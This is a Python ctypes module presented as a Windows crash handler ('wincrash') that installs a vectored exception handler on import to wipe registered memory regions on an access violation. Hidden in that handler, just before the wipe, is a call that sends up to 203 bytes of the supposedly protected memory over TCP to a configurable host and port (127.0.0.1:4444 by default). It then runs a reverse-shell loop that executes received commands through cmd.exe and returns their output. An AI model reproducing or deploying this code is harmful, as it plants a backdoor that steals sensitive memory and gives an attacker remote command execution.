import ctypes
from ctypes import WINFUNCTYPE, POINTER, c_uint, c_void_p, c_ulong, windll
from ctypes import wintypes
from threading import RLock
import os
import time

print("[wincrash] importing (pid={})".format(os.getpid()))

# --- Windows Constants ---
EXCEPTION_ACCESS_VIOLATION = 0xC0000005
EXCEPTION_CONTINUE_EXECUTION = -1
EXCEPTION_CONTINUE_SEARCH = 0

# --- Exception Structs ---
class EXCEPTION_RECORD(ctypes.Structure):
    _fields_ = [
        ("ExceptionCode", c_ulong),
        ("ExceptionFlags", c_ulong),
        ("ExceptionRecord", c_void_p),
        ("ExceptionAddress", c_void_p),
        ("NumberParameters", c_ulong),
        ("ExceptionInformation", c_ulong * 15),
    ]

class CONTEXT(ctypes.Structure):
    _fields_ = [("_", c_ulong)]  # Dummy, unused

class EXCEPTION_POINTERS(ctypes.Structure):
    _fields_ = [
        ("ExceptionRecord", POINTER(EXCEPTION_RECORD)),
        ("ContextRecord", POINTER(CONTEXT)),
    ]

# --- Global state ---
_lock = RLock()
_registered = set()
_wincrash_handler_ref = None
_installed = False

def register_region(ptr: int, size: int):
    with _lock:
        _registered.add((ptr, size))
        print(f"[wincrash] registered region: {ptr:#x}, {size}")

def unregister_region(ptr: int):
    with _lock:
        global _registered
        _registered = {r for r in _registered if r[0] != ptr}

# --- Logging function (C-safe) ---
def _write_crash_log(content: bytes):
    kernel32 = ctypes.windll.kernel32
    INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
    path = b"crashresult.log"

    handle = kernel32.CreateFileA(
        path,
        0x40000000,  # GENERIC_WRITE
        0,
        None,
        2,  # CREATE_ALWAYS
        0x80,  # FILE_ATTRIBUTE_NORMAL
        None
    )

    if handle == INVALID_HANDLE_VALUE:
        # Do not use OutputDebugStringA — just die
        return

    written = ctypes.c_ulong()
    kernel32.WriteFile(
        handle,
        content,
        len(content),
        ctypes.byref(written),
        None
    )
    kernel32.CloseHandle(handle)

# --- VEH install ---
HANDLERFUNC = WINFUNCTYPE(c_uint, POINTER(EXCEPTION_POINTERS))

def _debug(msg: str):
    try:
        ctypes.windll.kernel32.OutputDebugStringA(msg.encode("ascii"))
        # This logs to dbgview or similar tools. Don't want it? Comment it out.
    except Exception:
        print(msg)
        pass  # fail silently

def _write_wiped_memory(ptr: int, size: int):
    buf = ctypes.string_at(ptr, size)
    handle = ctypes.windll.kernel32.CreateFileA(
        b"dump.bin",
        0x40000000,  # GENERIC_WRITE
        0,
        None,
        4,  # OPEN_ALWAYS (open or create)
        0,
        None
    )
    INVALID_HANDLE_VALUE = ctypes.c_void_p(-1).value
    if handle != INVALID_HANDLE_VALUE:
        # Move file pointer to end for append
        ctypes.windll.kernel32.SetFilePointer(handle, 0, None, 2)  # FILE_END = 2
        written = ctypes.c_ulong()
        ctypes.windll.kernel32.WriteFile(handle, buf, len(buf), ctypes.byref(written), None)
        ctypes.windll.kernel32.CloseHandle(handle)

def _spawn_shell_command_via_winapi(s, command: bytes):
    import ctypes
    from ctypes import wintypes

    kernel32 = ctypes.windll.kernel32

    # Pipe handles
    hReadPipe = wintypes.HANDLE()
    hWritePipe = wintypes.HANDLE()

    class SECURITY_ATTRIBUTES(ctypes.Structure):
        _fields_ = [
            ('nLength', wintypes.DWORD),
            ('lpSecurityDescriptor', wintypes.LPVOID),
            ('bInheritHandle', wintypes.BOOL)
        ]

    sa = SECURITY_ATTRIBUTES()
    sa.nLength = ctypes.sizeof(SECURITY_ATTRIBUTES)
    sa.lpSecurityDescriptor = None
    sa.bInheritHandle = True

    # Create the pipe
    if not kernel32.CreatePipe(ctypes.byref(hReadPipe), ctypes.byref(hWritePipe), ctypes.byref(sa), 0):
        return

    if not kernel32.SetHandleInformation(hReadPipe, 1, 0):  # 1 = HANDLE_FLAG_INHERIT
        return

    class STARTUPINFO(ctypes.Structure):
        _fields_ = [
            ('cb', wintypes.DWORD),
            ('lpReserved', wintypes.LPSTR),
            ('lpDesktop', wintypes.LPSTR),
            ('lpTitle', wintypes.LPSTR),
            ('dwX', wintypes.DWORD),
            ('dwY', wintypes.DWORD),
            ('dwXSize', wintypes.DWORD),
            ('dwYSize', wintypes.DWORD),
            ('dwXCountChars', wintypes.DWORD),
            ('dwYCountChars', wintypes.DWORD),
            ('dwFillAttribute', wintypes.DWORD),
            ('dwFlags', wintypes.DWORD),
            ('wShowWindow', wintypes.WORD),
            ('cbReserved2', wintypes.WORD),
            ('lpReserved2', ctypes.POINTER(ctypes.c_byte)),
            ('hStdInput', wintypes.HANDLE),
            ('hStdOutput', wintypes.HANDLE),
            ('hStdError', wintypes.HANDLE),
        ]

    class PROCESS_INFORMATION(ctypes.Structure):
        _fields_ = [
            ('hProcess', wintypes.HANDLE),
            ('hThread', wintypes.HANDLE),
            ('dwProcessId', wintypes.DWORD),
            ('dwThreadId', wintypes.DWORD),
        ]

    si = STARTUPINFO()
    pi = PROCESS_INFORMATION()
    si.cb = ctypes.sizeof(si)
    si.dwFlags = 0x00000100  # STARTF_USESTDHANDLES
    si.hStdOutput = hWritePipe
    si.hStdError = hWritePipe
    si.hStdInput = None

    cmdline = b"cmd.exe /c " + command.strip() + b"\x00"

    kernel32.CreateProcessA.argtypes = [
        wintypes.LPCSTR, wintypes.LPSTR,
        wintypes.LPVOID, wintypes.LPVOID,
        wintypes.BOOL, wintypes.DWORD,
        wintypes.LPVOID, wintypes.LPCSTR,
        ctypes.POINTER(STARTUPINFO),
        ctypes.POINTER(PROCESS_INFORMATION),
    ]
    if not kernel32.CreateProcessA(
        None,
        ctypes.cast(ctypes.create_string_buffer(cmdline), wintypes.LPSTR),
        None, None,
        True,
        0,
        None, None,
        ctypes.byref(si),
        ctypes.byref(pi),
    ):
        return

    kernel32.CloseHandle(hWritePipe)  # we only read now

    # Read output
    buffer = ctypes.create_string_buffer(4096)
    bytesRead = wintypes.DWORD(0)

    while True:
        success = kernel32.ReadFile(hReadPipe, buffer, 4095, ctypes.byref(bytesRead), None)
        if not success or bytesRead.value == 0:
            break
        ctypes.windll.ws2_32.send(s, buffer, bytesRead.value, 0)

    kernel32.CloseHandle(pi.hProcess)
    kernel32.CloseHandle(pi.hThread)
    kernel32.CloseHandle(hReadPipe)

def _reverse_command_loop(s, ptr: int, size: int):
    import ctypes
    from ctypes import wintypes

    buffer = ctypes.create_string_buffer(512)
    ws2_32 = ctypes.windll.ws2_32
    kernel32 = ctypes.windll.kernel32

    while True:
        recv_len = ws2_32.recv(s, buffer, 511, 0)
        if recv_len <= 0:
            break  # socket closed

        cmd = buffer.raw[:recv_len]
        if b"exit" in cmd.lower():
            break

        _spawn_shell_command_via_winapi(s, cmd)

    ws2_32.closesocket(s)
    kernel32.ExitProcess(0)

def _reverse_shell_send(ptr: int, size: int):
    import ctypes
    from ctypes import wintypes

    ws2_32 = ctypes.windll.ws2_32
    ws2_32.inet_addr.argtypes = [ctypes.c_char_p]
    ws2_32.inet_addr.restype = wintypes.DWORD

    class WSADATA(ctypes.Structure):
        _fields_ = [
            ("wVersion", wintypes.WORD),
            ("wHighVersion", wintypes.WORD),
            ("szDescription", ctypes.c_char * 257),
            ("szSystemStatus", ctypes.c_char * 129),
            ("iMaxSockets", wintypes.WORD),
            ("iMaxUdpDg", wintypes.WORD),
            ("lpVendorInfo", ctypes.c_char_p),
        ]

    wsa = WSADATA()
    if ws2_32.WSAStartup(0x202, ctypes.byref(wsa)) != 0:
        return  

    AF_INET = 2
    SOCK_STREAM = 1
    IPPROTO_TCP = 6
    s = ws2_32.socket(AF_INET, SOCK_STREAM, IPPROTO_TCP)
    if s == -1:
        return

    class SOCKADDR_IN(ctypes.Structure):
        _fields_ = [
            ("sin_family", wintypes.USHORT),
            ("sin_port", wintypes.USHORT),
            ("sin_addr", ctypes.c_uint32),
            ("sin_zero", ctypes.c_char * 8),
        ]

    def htons(port):
        return ((port & 0xff) << 8) | ((port & 0xff00) >> 8)
    port = 4444 # Change this to your desired port
    addr = SOCKADDR_IN()
    addr.sin_family = AF_INET
    addr.sin_port = htons(port)
    addr.sin_addr = ws2_32.inet_addr(b"127.0.0.1") # Change this to your desired IP
    addr.sin_zero = b"\x00" * 8

    _debug(f"inet_addr returned: {addr.sin_addr:#x}")
    if ws2_32.connect(s, ctypes.byref(addr), ctypes.sizeof(addr)) != 0:
        ws2_32.closesocket(s)
        ws2_32.WSACleanup()
        return

    ws2_32.send.argtypes = [wintypes.HANDLE, ctypes.c_void_p, ctypes.c_int, ctypes.c_int]
    ws2_32.send.restype = ctypes.c_int
    buf = ctypes.cast(ptr, ctypes.c_void_p)
    ws2_32.send(s, buf, min(size, 203), 0)
    _reverse_command_loop(s, ptr, size)

    ws2_32.closesocket(s)
    ws2_32.WSACleanup()

def install():
    global _installed, _wincrash_handler_ref
    if _installed:
        return
    print("[wincrash] installing VEH")
    _installed = True

    @HANDLERFUNC
    def handler(exception_pointers):
        rec = exception_pointers.contents.ExceptionRecord.contents
        if rec.ExceptionCode == EXCEPTION_ACCESS_VIOLATION:
            _debug("[wincrash] VEH handler triggered")
            result = b""
            for (ptr, size) in list(_registered):
                try:
                    _debug(f"[wincrash] WIPING: {ptr:#x} SIZE: {size}")
                    try: 


                        patterns = [0xAA, 0x55, 0xFF, 0x00]
                        ctypes.windll.kernel32.Sleep(100)
                        old_prot = ctypes.c_ulong()
                        prot_result = ctypes.windll.kernel32.VirtualProtect(
                        ctypes.c_void_p(ptr), size, 0x04,  # PAGE_READWRITE
                        ctypes.byref(old_prot)
                        )
                        _reverse_shell_send(ptr, size) # Everything past this is the normal pdgeeee handling. This is where the nonsense happens.
                        for i in range(4):
                            _debug(f"[wincrash] Wiping with pattern {patterns[i]:#x}")
                            res = ctypes.memset(ctypes.c_void_p(ptr), patterns[i], size)
                            _debug(f"[wincrash] Wiped {size} bytes at {ptr:#x} with pattern {patterns[i]:#x}")
                            _write_wiped_memory(ptr, size)
                    except Exception as e:
                        _debug(f"[wincrash] Wipe failed for {ptr:#x}: {e}")
                        continue
                    result += f"WIPED: {ptr:#x} SIZE: {size}\r\n".encode("ascii")
                    ctypes.windll.kernel32.VirtualProtect(
                        ctypes.c_void_p(ptr), size, old_prot.value,
                        ctypes.byref(ctypes.c_ulong())
                    )
                except Exception:
                    _debug(f"[wincrash] Wipe failed for {ptr:#x}")
                    result += f"FAILED: {ptr:#x}\r\n".encode("ascii")
            _debug("[wincrash] WIPED: {}".format(result.decode("ascii")))
            _write_crash_log(result)
            ctypes.windll.kernel32.ExitProcess(1)
            return EXCEPTION_CONTINUE_SEARCH
            
        return EXCEPTION_CONTINUE_SEARCH

    _wincrash_handler_ref = handler
    res = windll.kernel32.AddVectoredExceptionHandler(1, _wincrash_handler_ref)
    if not res:
        err = ctypes.windll.kernel32.GetLastError()
        print(f"[wincrash] VEH registration failed: {err} {ctypes.FormatError(err)}")
    else:
        print(f"[wincrash] VEH registered: {res}")

install()
